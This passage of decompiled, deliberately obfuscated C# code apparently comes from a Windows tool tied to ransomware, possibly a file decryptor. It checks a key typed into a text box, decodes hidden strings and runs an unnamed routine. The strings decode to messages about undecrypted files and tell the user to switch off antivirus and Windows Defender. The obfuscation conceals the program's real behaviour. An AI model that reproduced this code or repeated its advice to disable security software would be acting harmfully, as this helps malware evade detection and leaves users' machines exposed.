			15672, 21, 294, 31, 126062, -242826, -81888, 78998, -4417, -81131,
			-246055, -33636, 331324
		};
		char[] array3 = new char[2] { '\u0001', '첗' };
		int[] array4 = new int[array2[3]];
		array4[(uint)array[1]] = (int)((nint)((Array)(object)string.Empty).LongLength % 847596);
		int num = (array4[1] = array[0]);
		array4[2] = array[6];
		array4[3] = array2[26] - -162548;
		array4[4] = Convert.ToInt32(char.ToString('f') + "fffffff", 16);
		char c = (char)array2[27];
		array4[5] = c;
		int[] array5 = array4;
		string text = ((Control)Ldloc).get_Text();
		if (text == get_UnmanagedCode.add_ModuleResolve)
		{
			UnorderedNotEqualSignaling leadingZeroCount = LeadingZeroCount;
			string string_ = char.ToString('᭗') + "᭗᭗";
			object[] array6 = new object[4];
			array6[Convert.ToInt32("0", 16)] = char.ToString((char)array2[28]) + char.ToString('Ӎ') + "ʪB";
			array6[1] = false;
			array6[Convert.ToInt32("2", 16)] = array[7];
			array6[(nint)((Array)(object)(char.ToString('\u032a') + "\u032e\u0337")).LongLength] = string.Concat(char.ToString('ԯ'), char.ToString('ż') + char.ToString('\u0014') + "Ñ.");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_, array6);
			string text2 = string_;
			string string_2 = char.ToString('⼜') + char.ToString('⼺') + "⼬⼻";
			object[] array7 = new object[(nint)((Array)(object)(char.ToString('\u032f') + "\u0345\u0336\u0313")).LongLength];
			array7[~GetDllEntry] = 268;
			array7[Convert.ToInt32("1", ((Array)(object)"\u030f\u0331").Length)] = 0x2A | array[21];
			IntPtr intPtr = (nint)((Array)(object)"\u0339\u032c").LongLength;
			int num2 = ((Array)(object)string.Empty).Length;
			array7[(nint)intPtr] = (byte)num2 != 0;
			array7[3] = '\u001a';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_2, array7);
			string text3 = string_2;
			string string_3 = string.Concat("徚忒", "忛忉", "徚忟忔忎" + "忟忈忟忞徚忙忕忈");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_3, new object[3]
			{
				'悇',
				9460 % (int)array[22],
				(char)_003CModule_003E.ActivityOptions[16]
			});
			string text4 = text2 + text3 + string_3;
			string text5 = char.ToString('⺪');
			string string_4 = string.Concat("톋톍", char.ToString('톚') + char.ToString('퇎') + "톊톋");
			object[] array8 = new object[endAction];
			array8[0] = string.Concat(char.ToString('\u20eb'), char.ToString((char)get_TimeStamp), char.ToString('攚') + char.ToString('Ұ') + "ᱤ⅊");
			array8[Convert.ToInt32("1", 8)] = string.Concat(char.ToString('ख'), char.ToString('у') + "Ϛǁ");
			array8[1272770152 / Convert.ToInt32("25ee7734", 16)] = 6462;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_4, array8);
			string text6 = string_4;
			string string_5 = string.Concat(char.ToString('蚲'), "蚣蚨蚡蚥蚸蚾" + "蚿蛱蚺蚴蚨蛿蛿蛱蚕" + "蚴蚲蚣蚨蚡蚥蚸蚿蚶蛱蚷蚸蚽蚴蚢蛿蚱蚱蚱");
			object[] array9 = new object[get_CurrencyGroupSeparator | 2];
			array9[0] = 39756;
			array9[Convert.ToInt32("1", 2)] = 1287;
			int num3 = sizeof(ushort);
			array9[num3] = 1974;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array9);
			string string_6 = string.Concat(text4, text5 + text6 + string_5);
			object[] array10 = new object[3];
			array10[array5[(nint)((Array)(object)string.Empty).LongLength]] = (int)array3[Convert.ToInt32("1", 2) * Convert.ToInt32("1", 16)] % (0x1154 | TX_TS);
			int num4;
			if (-81211 * get_CurrencyGroupSeparator == -87621 * get_CurrencyGroupSeparator)
			{
				num4 = Convert.ToInt32(char.ToString('6') + char.ToString('6') + "24560", 8) % 712032;
			}
			else
			{
				int num5 = (((nint)((Convert.ToInt32(char.ToString('1') + char.ToString('0') + "000010111101011", array[0]) < Convert.ToInt32(char.ToString('1') + "10" + "1110100100110", 2)) ? 1 : 0) != (nint)((Array)(object)string.Empty).LongLength) ? OnStart : Convert.ToInt32("1", 16));
				num4 = num5;
			}
			int num6 = num4;
			string string_7 = "蟲蚌";
			object[] array11 = new object[endAction * 2];
			array11[0] = false;
			array11[1] = string.Concat(char.ToString((char)Convert.ToInt32("1101101110110", 2)), char.ToString('\u02d2') + char.ToString('\u02f8') + "\u03550\u0005");
			array11[array2[0]] = string.Concat(char.ToString((char)Convert.ToInt32("7266", 8)), char.ToString('Ҡ') + char.ToString('غ') + "ॵ2ĥ");
			array11[Convert.ToInt32("325076", 8) >> 15] = 2371;
			array11[Convert.ToInt32("14", 16) % _003CModule_003E.get_PositiveSign[3]] = 2884;
			int num7 = Convert.ToInt32("101", 2);
			array11[num7] = 10505;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_7, array11);
			array10[num6] = string_7;
			array10[array5[HasFlagsAttribute]] = 'ѯ';
			_003CModule_003E.GetMaxByteCount(ref string_6, array10);
			leadingZeroCount.ExecutionEngineException(string_6);
			string text7 = char.ToString('ꁽ');
			string string_8 = char.ToString('䫸') + "䫤䪽";
			object[] array12 = new object[3];
			char c2 = (char)Convert.ToInt32("0", 8);
			array12[(int)c2] = _003CModule_003E.KeyValuePair__2[17];
			char c3 = (char)Convert.ToInt32("6e", 16);
			array12[1] = (int)c3;
			array12[Convert.ToInt32("2", 16)] = array2[8];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_8, array12);
			string text8 = text7 + string_8;
			string text9 = char.ToString(array[8]);
			string string_9 = char.ToString('笶') + "筥符";
			object[] array13 = new object[Marshal.SizeOf(typeof(OverlappedData))];
			array13[0] = 3623;
			array13[get_CurrencyGroupSeparator] = Convert.ToInt32("101" + "110" + "10100000", Convert.ToInt32("2", 8));
			array13[2] = IsGmtCount;
			array13[EnumName - 415604] = Convert.ToInt32(char.ToString('5') + "6425", 8);
			array13[4] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_9, array13);
			string text10 = text9 + string_9;
			string string_10 = string.Concat("鰎鰓", char.ToString('鰓'), char.ToString('鰄') + char.ToString('鰂') + "鰕鱏鱁鰥鰄鰂");
			object[] array14 = new object[5];
			array14[0] = Convert.ToInt32("11" + "10" + "0000000", 2);
			array14[Convert.ToInt32("1", Convert.ToInt32("2", 8))] = 'қ';
			char c4 = (char)_003CModule_003E.ActivityOptions[0];
			array14[(uint)c4] = 386;
			array14[3] = Convert.ToInt32(char.ToString('1') + "1352", Convert.ToInt32("1000", 2));
			array14[sizeof(uint)] = 7248;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_10, array14);
			string text11 = string_10;
			string string_11 = string.Concat(char.ToString('㉺') + "㉱㉸㉼㉡", "㉦㉯㈨㉮" + "㉡㉤㉭㉻㈦㈦㈦");
			object[] array15 = new object[Convert.ToInt32("3005201100", 8) / Convert.ToInt32("400700140", 8)];
			array15[_003CModule_003E.ActivityOptions[(uint)array[2]]] = (char)_003CModule_003E.ActivityOptions[(nint)((Array)(object)"\u030c\u0311\u0343\u0352\u0311\u0364").LongLength];
			array15[1] = (byte)((uint)array2[30] ^ 0xFFFA87A9u) != 0;
			array15[Marshal.SizeOf(typeof(ENODATA))] = (char)(_003CModule_003E.get_PositiveSign[121] ^ Convert.ToInt32("37777201034", 8));
			array15[array2[4]] = string.Concat("Ʋত", char.ToString('ù') + char.ToString('Ÿ') + "üк");
			array15[sizeof(float)] = 0x7D77 & array2[31];
			array15[checked(Convert.ToInt32("11111111111100011001001001000010", 2) + 945603)] = ~Convert.ToInt32("37777777473", 8);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_11, array15);
			string string_12 = string.Concat(text8, text10, text11 + string_11);
			object[] array16 = new object[-222093 + (Convert.ToInt32("11111" + "11111" + "1111110111111100011011", 2) - -255095)];
			int num8 = array[1];
			int num10 = default(int);
			switch (num8 % (271586 + -2219715 % Convert.ToInt32("11111111111100100111001110110010", 2)))
			{
			case 0:
				num10 = 0;
				break;
			case 1:
			{
				int num9 = ((-77949 > array2[CompatibilitySwitch]) ? 303994 : checked(Convert.ToInt32("22d4d", 16) + -483872));
				num10 = num9;
				break;
			}
			}
			int hasFlagsAttribute;
			checked
			{
				array16[num10] = (0x24C70089 | (0x4852F7E ^ Convert.ToInt32("fffdccdc", 16))) * unchecked(Convert.ToInt32(char.ToString('f') + "ff412e2", 16) - -781595);
				hasFlagsAttribute = HasFlagsAttribute;
			}
			string string_13 = string.Concat(char.ToString((char)Convert.ToInt32("9311", 16)), char.ToString((char)_003CModule_003E.ActivityOptions[106]), char.ToString('錓') + "錒錗");
			object[] array17 = new object[2];
			array17[get_PositiveInfinity] = Convert.ToInt32(char.ToString('1') + char.ToString('4') + "033", 8);
			array17[Convert.ToInt32("1", 8)] = "㹐㲼";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_13, array17);
			int num11;
			if (Convert.ToInt32(string_13, 8) > 860842)
			{
				num11 = ((Convert.ToInt32("37" + "77" + "7521306", array[19]) < CompareGreaterThan) ? (array2[33] >> 9) : array2[(nint)((Array)(object)"\u034e\u0347\u0351\u0340\u0358\u0305\u0369\u0332\u035b\u033b").LongLength]);
			}
			else
			{
				int num12 = 0x77F76 ^ IMPLTYPEFLAGS;
				num11 = num12;
			}
			array16[hasFlagsAttribute] = (byte)num11 != 0;
			int num13 = Convert.ToInt32("1000101000101000101", 2) >> 1;
			int num14 = (('\0' != array[1]) ? __c__DisplayClass0_16 : 816032);
			string string_14;
			object[] array18;
			checked
			{
				array16[2] = num13 + num14 + unchecked(-1715410 + (0x89270 | Marshal.SizeOf(typeof(TimeZoneInfoOptions))));
				string_14 = "缣缣";
				array18 = new object[unchecked(_003CModule_003E.ActivityOptions[108] + Convert.ToInt32("1e964", 16))];
				array18[array2[1]] = char.ToString('=') + "ᓖ]";
				array18[get_CurrencyGroupSeparator * 1] = string.Concat("\u103a\u05ce", char.ToString('㠁') + char.ToString('¥') + "\tG");
			}
			array18[_003CModule_003E.ActivityOptions[0] & Convert.ToInt32("10", 2)] = char.ToString((char)_003CModule_003E.KeyValuePair__2[116]) + "ሻ\u05f7";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_14, array18);
			string value = string_14;
			char c5 = (char)('\u0002' | array[0]);
			int num15 = Convert.ToInt32(value, c5);
			int num16 = default(int);
			switch (checked(-501352 - Convert.ToInt32("fff85997", 16)))
			{
			case 0:
				num16 = Convert.ToInt32("37777567570", 8);
				break;
			case 1:
				num16 = Convert.ToInt32("1001001001000011100000001111001", 2);
				break;
			}
			int num17 = num16 >> _003CModule_003E.ActivityOptions[2] * 1;
			string string_15 = string.Concat(char.ToString('샴'), char.ToString('샴'), char.ToString('샲') + char.ToString('샱') + "샳샰");
			object[] array19 = new object[Convert.ToInt32("11111111111100011000110100000011", 2) ^ Convert.ToInt32("fff18d06", 16)];
			array19[0] = 18012;
			array19[checked(1 * array2[2])] = string.Concat(char.ToString('㚨'), char.ToString('ጪ') + char.ToString('Ѕ') + "ʱ'=");
			array19[10 % get_ResourceExposureLevel] = _003CModule_003E.ActivityOptions[17];
			array19[Marshal.SizeOf(typeof(CharSetMask))] = "ՁᏆ";
			array19[4] = string.Concat(char.ToString('ॽ'), char.ToString(']') + char.ToString('\u0012') + "\b\u0016");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_15, array19);
			array16[num15] = (char)(num17 / Convert.ToInt32(string_15, checked(_003CModule_003E.get_PositiveSign[3] * get_CurrencyGroupSeparator)));
			int num18 = array[23];
			string text12;
			string string_16;
			checked
			{
				array16[11789 * num18 >> (Marshal.SizeOf(typeof(Stopped)) & (Convert.ToInt32("11663724025", 8) >> 26))] = ((8859 != _003CModule_003E.Dequeue[Convert.ToInt32("a", 16)]) ? 1540 : (Convert.ToInt32("4641112", 8) - Marshal.SizeOf(typeof(IsAssembly)) - (GetModules << 1)));
				_003CModule_003E.GetMaxByteCount(ref string_12, array16);
				text12 = string_12;
				string_16 = "\ud866\ud841";
			}
			object[] obj = new object[3]
			{
				(int)array[Convert.ToInt32("9", 16)],
				null,
				null
			};
			int num19 = array2[2];
			obj[num19] = (byte)checked(728710 + NullTextWriter) != 0;
			obj[2] = Convert.ToInt32("10101" + "0011010111", 2);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_16, obj);
			string text13 = string_16;
			string string_17 = char.ToString((char)TaskAwaiter) + "䷞䷃";
			object[] array20 = new object[(nint)((Array)(object)"\u0353\u0352\u0348\u030e\u032c\u0325\u0338.\u0303\u0368\u0301\u0356\u0347\u0318\u0326").LongLength % 6];
			array20[0 % array2[34]] = Marshal.SizeOf(typeof(set_MessageId));
			array20[1] = 'Ձ';
			array20[2] = (byte)(Convert.ToInt32("1", 16) & get_PositiveInfinity) != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_17, array20);
			string text14 = string_17;
			string string_18 = char.ToString('坏') + "圽圎";
			object[] array21 = new object[Convert.ToInt32("4", 8) | 0];
			array21[Convert.ToInt32("0", array2[0])] = (char)Marshal.SizeOf(typeof(LocalizationResources));
			array21[1] = (char)Convert.ToInt32("16757", 8);
			array21[array2[0]] = 'ⵔ';
			int num20 = Convert.ToInt32("3", 16);
			char c6 = (char)Convert.ToInt32("0", 16);
			array21[num20] = (byte)c6 != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_18, array21);
			string text15 = string_18;
			string string_19 = string.Concat(char.ToString((char)Convert.ToInt32("110011001110010", 2)), char.ToString((char)MarkSequencePoint), "晳晱" + "晫晽普晹");
			object[] array22;
			checked
			{
				array22 = new object[unchecked((int)array[0]) * 1];
			}
			int num21 = default(int);
			switch (0 % array2[35])
			{
			case 0:
				num21 = 0;
				break;
			}
			array22[num21] = (char)Convert.ToInt32(char.ToString('4') + "065", GCHeapDumpKeyword);
			array22[1] = Convert.ToInt32("100" + "000" + "01011111", _003CModule_003E.ActivityOptions[0]);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_19, array22);
			string string_20 = string.Concat(text13, text14 + text15 + string_19);
			int num22 = array5[2];
			int num23 = default(int);
			switch (Convert.ToInt32("67d6ab26", 16) / Convert.ToInt32("1100111110101101010101100100110", 2))
			{
			case 0:
				num23 = -20988;
				break;
			case 1:
				num23 = 1552774085;
				break;
			}
			object[] array23;
			int num24;
			string text16;
			int num25;
			checked
			{
				array23 = new object[num22 * unchecked(num23 / Convert.ToInt32(char.ToString('5') + char.ToString('c') + "8d73c5", 16))];
				num24 = 0 | (_003CModule_003E.get_PositiveSign[_003CModule_003E.KeyValuePair__2[12]] + -245042);
				text16 = char.ToString('ǽ');
				num25 = array2[2];
			}
			string text17 = char.ToString((char)checked(397 * num25));
			string text18 = char.ToString('#');
			string string_21 = char.ToString((char)Convert.ToInt32("df67", 16)) + "\udf2f\udf25";
			object[] array24 = new object[3];
			int num26 = ((46957 >= Convert.ToInt32("11000011001010000001", 2)) ? Convert.ToInt32("11111111111110101111000110001011", 2) : 0);
			array24[num26] = MultiplyRoundedDoublingBySelectedScalarAndSubtractSaturateHigh;
			array24[array2[2]] = 55740;
			char c7 = (char)Convert.ToInt32("0", 8);
			array24[2] = (byte)c7 != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_21, array24);
			array23[num24] = string.Concat(text16, text17, text18 + string_21);
			int num27 = ~Convert.ToInt32("11111111111111001110111100111111", 2);
			int num28 = ((Convert.ToInt32("11111111111111110001010101010111", 2) >= -683804) ? (-200896) : (-990907));
			char num29 = array3[checked(num27 + num28)];
			string text19 = char.ToString((char)((Convert.ToInt32("fffab027", 16) - -623496) ^ Convert.ToInt32(char.ToString('1') + "031263", 8)));
			string text20 = char.ToString((char)(641888108 / Convert.ToInt32("110011126", 8)));
			string string_22 = string.Concat(char.ToString((char)array2[36]), char.ToString('㪬') + "㪫㪫㪨");
			object[] array25 = new object[Convert.ToInt32("2055", 8) >> 8];
			array25[0] = false;
			array25[(nint)((Array)(object)"\u030f").LongLength] = array2[37] << 1;
			int num30 = Convert.ToInt32("54cff8b4", 16) / 711457882;
			int num31 = ((54334 > Convert.ToInt32("11111111111100101111100011110010", 2)) ? 4 : (-633892));
			array25[num30] = num31;
			array25[3] = Convert.ToInt32("37535", 8) & _003CModule_003E.get_PositiveSign[123];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_22, array25);
			array23[(uint)num29] = string.Concat(text19, text20 + string_22);
			int num32 = Marshal.SizeOf(typeof(IBindCtx)) / 1058760491;
			string string_23 = "딺";
			object[] array26 = new object[5];
			array26[(uint)array[(uint)array[2]]] = 1062;
			array26[1] = (int)array[10];
			array26[2] = 29184;
			array26[(uint)array[4]] = (byte)Convert.ToInt32("0", 2) != 0;
			array26[4] = '㝪';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_23, array26);
			array23[num32 * Convert.ToInt32(string_23, 16)] = 'Ĕ';
			char c8 = (char)_003CModule_003E.KeyValuePair__2[0];
			char c9 = c8;
			char num33 = c9;
			string string_24 = "\ue436";
			object[] array27 = new object[5];
			array27[0] = (char)Convert.ToInt32(char.ToString('5') + "07", dwCookie);
			array27[(uint)array[2]] = 2064289920 / Convert.ToInt32("368b0", 16);
			array27[(nint)((Array)(object)"\u033c\u0345").LongLength] = '㿯';
			int num34 = ((1 != Convert.ToInt32("0", 2)) ? 3 : 809942);
			array27[num34] = Convert.ToInt32(char.ToString('1') + "974", 16);
			array27[Convert.ToInt32("10100", 2) % 8] = array2[11];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_24, array27);
			string value2 = string_24;
			int num35 = default(int);
			switch (228857 + array2[38])
			{
			case 0:
				num35 = 8;
				break;
			}
			array23[(uint)num33] = (byte)Convert.ToInt32(value2, 0 | num35) != 0;
			int num36 = Convert.ToInt32("3", 16);
			int num37 = array5[num36] | ConfiguredTaskAwaitable__1;
			int num38 = ((AsRef / _003CModule_003E.ActivityOptions[2] != checked(Convert.ToInt32("206772", 8) - 114539)) ? (-939729) : (Convert.ToInt32("11111111111110001111111101011101", 2) + -531004));
			TextBox hString;
			string text22;
			string string_26;
			object[] array29;
			checked
			{
				array23[num37] = num38 + 989977;
				_003CModule_003E.GetMaxByteCount(ref string_20, array23);
				string text21 = string_20;
				int num39 = Convert.ToInt32(char.ToString('c') + char.ToString('a') + "a3d", ((Array)(object)"\u035a\u0332\u0303\u033b\u036b\u031c\u0303\u033b\u034e\u030c\u031e\u0302\u0364\u0302\u0348\u0318").Length);
				MessageBox.Show(text12, text21, (MessageBoxButtons)(num39 - (0xFEFBD & unchecked(719940 + Convert.ToInt32("1ae3b", 16)))), (MessageBoxIcon)EventLevel);
				get_UnmanagedCode.GetEncoding = get_UnmanagedCode.add_ModuleResolve;
				hString = HString;
				string string_25 = string.Concat(char.ToString(array[24]), char.ToString('\u0c72') + char.ToString('\u0c74') + "\u0c65౮");
				object[] array28 = new object[Convert.ToInt32("3", Convert.ToInt32("10", 8))];
				array28[0] = false;
				array28[1] = string.Concat("⇑ǎ", char.ToString('ஏ') + char.ToString('ç') + "८ƭ");
				array28[2] = Convert.ToInt32("100" + char.ToString('0') + "001100011", 2);
				_003CModule_003E.TAIWANLUNISOLAR(ref string_25, array28);
				text22 = string_25;
				string_26 = string.Concat("\u0e6a\u0e6e", "\u0e73\u0e74", char.ToString('\u0e7d') + "\u0e3a\u0e7c\u0e73\u0e76\u0e7f");
				array29 = new object[Convert.ToInt32("1", 2) << 1];
			}
			array29[(nint)((Array)(object)string.Empty).LongLength] = string.Concat(char.ToString('℧'), char.ToString('ʂ') + char.ToString('ė') + "܊\u0327");
			array29[get_CurrencyGroupSeparator] = '᪭';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_26, array29);
			string text23 = text22 + string_26;
			string string_27 = char.ToString('躷') + char.ToString((char)Convert.ToInt32("8eea", 16)) + "軪軤";
			object[] array30 = new object[(uint)array[5]];
			char c10 = array[1];
			array30[(int)c10] = false;
			array30[array2[Convert.ToInt32("2", 8)]] = "ḷ\u0ce3";
			array30[2] = 39091;
			array30[endAction] = 'ճ';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_27, array30);
			string text24 = string_27;
			string string_28 = string.Concat(char.ToString('칔'), char.ToString('칓') + "츍츱츰츪칹");
			string text25;
			checked
			{
				object[] array31 = new object[-604522 - _003CModule_003E.KeyValuePair__2[117]];
				array31[0] = 24071;
				array31[1 * Convert.ToInt32("1", 2)] = 2465;
				array31[2] = char.ToString('\u1bf6') + "ȥĘ";
				array31[Convert.ToInt32("3", 8)] = '\u0302';
				_003CModule_003E.TAIWANLUNISOLAR(ref string_28, array31);
				text25 = text24 + string_28;
			}
			string string_29 = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(LineSeparator))), char.ToString('垈') + "垐埉");
			object[] array32 = new object[6];
			array32[0] = (byte)Convert.ToInt32("0", Convert.ToInt32("10", 2)) != 0;
			array32[_003CModule_003E.ActivityOptions[_003CModule_003E.ActivityOptions[0]]] = string.Concat(char.ToString(';'), char.ToString('\u0018'), char.ToString('\0') + "\0\u0002");
			int num40 = _003CModule_003E.ActivityOptions[0];
			int num41 = array[25];
			array32[num40] = num41;
			array32[3] = 441;
			array32[4] = 2362;
			array32[Convert.ToInt32("11001", 2) % 10] = array2[(nint)((Array)(object)"\u0340\u0489\u0328\u0331\u031f\u036b\u0313\u0340\u0365\u036d\u033a\u0300").LongLength];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_29, array32);
			string text26 = string_29;
			string string_30 = string.Concat(char.ToString('⹒') + "⹇⹍", "⹃⸆⹇⸆⹑" + "⹎⹏⹊⹃" + "⸈⸆\u2e6a⹉⹇⹂⹏⹈⹁⸈⸈");
			object[] array33 = new object[4];
			array33[Convert.ToInt32("0", 2) | 0] = string.Concat(char.ToString((char)array2[40]), char.ToString('⊾'), char.ToString('Ê') + "ίǖ");
			array33[_003CModule_003E.ActivityOptions[2]] = 662;
			array33[sizeof(short)] = Convert.ToInt32("37776252756", 8) ^ -436865;
			array33[Convert.ToInt32("11", 2)] = string.Concat(char.ToString((char)Convert.ToInt32("34", 8)), char.ToString('\u0013') + "\u0004\u0001\0\u0002");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_30, array33);
			string string_31 = string.Concat(text23, text25, text26 + string_30);
			int num42 = (('\u0001' != array[1]) ? Convert.ToInt32("11000011101011100", 2) : (-987823));
			object[] array34 = new object[-100187 + num42 << (Convert.ToInt32(char.ToString('1') + char.ToString('e') + "8a3710", 16) >> 28)];
			int num43 = default(int);
			switch (checked(217080 + Convert.ToInt32("1111" + "1111111111001011000000001000", 2)))
			{
			case 0:
				num43 = -16457;
				break;
			case 1:
				num43 = Convert.ToInt32("268da52f", 16) / 2941;
				break;
			}
			array34[0] = ~num43;
			string string_32 = "樂";
			object[] array35 = new object[6];
			int num44 = Convert.ToInt32("0", 8) / Convert.ToInt32("3068224c", 16);
			char c11 = (char)Marshal.SizeOf(typeof(get_HijriAdjustment));
			array35[num44] = (int)c11;
			array35[Marshal.SizeOf(typeof(UseHebrewParsing))] = 51721;
			array35[Marshal.SizeOf(typeof(ENODATA))] = (char)checked(-669627 + Convert.ToInt32("10100101101110110101", 2));
			array35[3] = 1004;
			int num45 = ((((14085 < Convert.ToInt32("e9100", 16)) ? 1u : 0u) != array[1]) ? 4 : 952670);
			array35[num45] = (byte)checked(_003CModule_003E.ActivityOptions[1] * 14032) != 0;
			array35[checked(148063 - Convert.ToInt32("2425a", 16))] = 82;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_32, array35);
			string value3 = string_32;
			string string_33 = string.Concat(char.ToString('ꁁ'), char.ToString('ꁀ') + "ꁀꁀ");
			object[] array36 = new object[3];
			array36[0] = '荰';
			array36[1] = (int)array[_003CModule_003E.KeyValuePair__2[7]];
			array36[array2[0]] = (byte)((Array)(object)string.Empty).Length != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_33, array36);
			array34[Convert.ToInt32(value3, Convert.ToInt32(string_33, 2))] = (tasks ^ InsertAt) % checked(_003CModule_003E.get_PositiveSign[18] * 2);
			_003CModule_003E.GetMaxByteCount(ref string_31, array34);
			((Control)hString).set_Text(string_31);
			Cursor.set_Current(Cursors.get_WaitCursor());
			MultiplyDoublingWideningLowerAndAddSaturate.TryWriteUInt16LittleEndian();
			Cursor.set_Current(Cursors.get_Default());
			string string_34 = "㐚㐯";
			object[] array37 = new object[5];
			array37[get_PositiveInfinity] = "ˬᆾ";
			array37[1] = string.Concat(char.ToString((char)ShortTimePattern), char.ToString('㍀'), char.ToString('ď') + "ŕġ");
			array37[2] = false;
			array37[_003CModule_003E.KeyValuePair__2[0]] = 948671184 / (int)array[26];
			array37[(uint)array[5]] = string.Concat(char.ToString('\u0323'), char.ToString('Z'), char.ToString('\u02ff') + char.ToString('\0') + "\0\0\u0002");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_34, array37);
			string text27 = string_34;
			string string_35 = "㏜㏄";
			object[] array38 = new object[Convert.ToInt32(char.ToString('1') + "01", 2)];
			array38[0] = 41881;
			array38[(uint)array[2]] = char.ToString('μ') + "ʅŢ";
			array38[1 << Convert.ToInt32("1", 8)] = (int)array[Convert.ToInt32("c", 16)];
			int num46 = ((_003CModule_003E.KeyValuePair__2[118] < Convert.ToInt32("8a869", 16)) ? 23 : (-911551));
			array38[3] = num46;
			int num47 = ((Convert.ToInt32("10011100110111010", 2) == -65742) ? (-929764) : Convert.ToInt32("4", 8));
			array38[num47] = 278;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_35, array38);
			string text28 = string_35;
			string string_36 = string.Concat(char.ToString('ᒘ'), char.ToString('ᓛ'), "ᓗᓕ" + "ᓈᓔᓝᓌᓝ");
			object[] array39 = new object[2];
			array39[0] = 12082;
			array39[(nint)((Array)(object)"\u0343").LongLength] = 40123;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_36, array39);
			string text29 = text27 + text28 + string_36;
			string string_37 = string.Concat("\ue102\ue10c\ue165\ue14a\ue10c" + "\ue158\ue144\ue149\ue15e\ue149\ue10c\ue14d\ue15e\ue149\ue10c\ue14a\ue145\ue140\ue149\ue15f\ue10c\ue158\ue144\ue14d\ue158\ue10c\ue144", "\ue14d\ue15a\ue149\ue10c\ue142\ue143\ue158" + "\ue10c\ue14e\ue149\ue149\ue142\ue10c\ue148" + "\ue149\ue14f\ue15e\ue155\ue15c\ue158\ue149\ue148\ue100\ue10c\ue141\ue14d\ue147\ue149\ue10c\ue15f");
			object[] array40 = new object[array2[6]];
			array40[0] = (byte)(Convert.ToInt32("1041246433", 8) >> 28) != 0;
			array40[(nint)((Array)(object)"\u036d").LongLength] = Marshal.SizeOf(typeof(ResolveField));
			array40[173018 + _003CModule_003E.KeyValuePair__2[119]] = '⁅';
			array40[3] = '\u034f';
			array40[4] = string.Concat(char.ToString('ጀ'), char.ToString((char)array2[42]), char.ToString('\t') + "\u001d\u000e");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_37, array40);
			string text30 = string_37;
			string string_38 = string.Concat("姒姕" + "姂妇姞姈姒妇姓姒姕姉", "妇姈" + char.ToString('姁') + "姁妇姆始始妇姆姉姓姎", "姑姎姕姒委妇姆姉姃妇" + "姰姎姉姃姈姐委妇姣姂姁姂姉姃姂姕妋妇姓姏姂姉妇");
			object[] array41 = new object[FlattenHierarchy];
			array41[0] = Convert.ToInt32(char.ToString('4') + char.ToString('3') + "51", 8);
			int num48 = Convert.ToInt32("1", 2);
			char c12 = (char)Convert.ToInt32("547", 8);
			array41[num48] = (char)(int)c12;
			array41[(uint)array[2] << 1] = char.ToString((char)_003CModule_003E.ActivityOptions[88]) + char.ToString((char)PureAttribute) + "ʹր";
			array41[3] = Convert.ToInt32("8", 16);
			string text31;
			string string_39;
			object[] array42;
			checked
			{
				array41[unchecked((nint)((Array)(object)"\u0345\u0328\u030a\u0339").LongLength) * sizeof(bool)] = 25404;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_38, array41);
				text31 = string_38;
				string_39 = string.Concat(char.ToString('\ue297') + char.ToString('\ue291') + "\ue29a\ue2c3\ue287\ue286\ue280\ue291", "\ue29a\ue293" + char.ToString('\ue297') + "\ue28a\ue28d\ue284\ue2c3\ue282\ue284", "\ue282\ue28a\ue28d\ue2cd\ue2c3\ue2ee\ue2e9\ue2aa\ue285\ue2c3\ue28a\ue297\ue2c3\ue287\ue28c\ue286\ue290\ue28d\ue2c4\ue297\ue2c3\ue294\ue28c\ue291\ue288\ue2cf\ue2c3\ue287\ue286\ue28f\ue286\ue297\ue286\ue2c3\ue282\ue28f\ue28f\ue2c3" + "\ue2a7\ue286\ue290\ue288\ue297\ue28c\ue293\ue2cd\ue28a\ue28d\ue28a\ue2cd\ue284\ue28a\ue295\ue286\ue28e\ue286\ue28d\ue28a\ue297\ue291\ue28c\ue2c3\ue285\ue28a\ue28f\ue286\ue290\ue2c3\ue297\ue28b\ue282\ue297\ue2c3\ue29a\ue28c\ue296\ue2c3\ue290\ue286\ue286\ue2c3\ue282\ue28d\ue287\ue2c3\ue297\ue291\ue29a\ue2c3\ue282\ue284\ue282\ue28a\ue28d\ue2cd");
				array42 = new object[array2[_003CModule_003E.ActivityOptions[3]]];
			}
			array42[array2[Marshal.SizeOf(typeof(UseHebrewParsing))]] = (char)array2[13];
			array42[array2[2]] = '᱂';
			array42[array2[array2[1]]] = (byte)array2[array2[2]] != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_39, array42);
			string string_40 = string.Concat(text29, text30 + text31 + string_39);
			string string_41 = "븀";
			object[] array43 = new object[-471148 ^ TicksPerHour];
			array43[0] = string.Concat(char.ToString('\u0736'), char.ToString(array[27]), char.ToString('\u008e') + "S\u0003");
			array43[1] = 10217;
			array43[(get_TickCount64 > -531650) ? Stream : (-369735)] = char.ToString('⒊') + "\u02d5揆";
